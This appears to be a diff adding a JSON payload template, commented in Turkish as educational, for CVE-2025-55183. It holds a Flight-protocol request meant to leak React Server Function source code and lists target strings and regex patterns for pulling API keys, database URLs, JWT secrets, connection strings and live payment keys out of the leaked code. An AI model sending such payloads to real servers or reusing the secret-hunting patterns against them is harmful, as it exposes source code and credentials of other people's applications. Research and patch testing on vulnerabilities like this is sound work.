@@ -1,0 +1,33 @@
+{
+  "_comment": "CVE-2025-55183 — Source Leak Payload Şablonu (Eğitim Amaçlı)",
+  "_description": "Server Function kaynak kodu ifşa payload'ları",
+  "source_leak": {
+    "description": "Flight protokolü üzerinden Server Function kaynak kodunu ifşa etme",
+    "payload_template": {
+      "flight_data": [
+        ["$", "@source", null, {
+          "type": "module",
+          "request": "server_function_source",
+          "expose": true
+        }]
+      ]
+    },
+    "target_patterns": [
+      "use server",
+      "export async function",
+      "process.env",
+      "DATABASE_URL",
+      "API_KEY",
+      "SECRET"
+    ]
+  },
+  "sensitive_patterns": [
+    "(?i)(api[_-]?key|api[_-]?secret)",
+    "(?i)(db[_-]?password|database[_-]?url)",
+    "(?i)(jwt[_-]?secret|signing[_-]?key)",
+    "(?i)(token|bearer|auth)",
+    "(?i)(postgresql://|mysql://|mongodb://)",
+    "(?i)(sk_live|pk_live|sk_test)"
+  ],
+  "content_type": "text/x-component"
+}
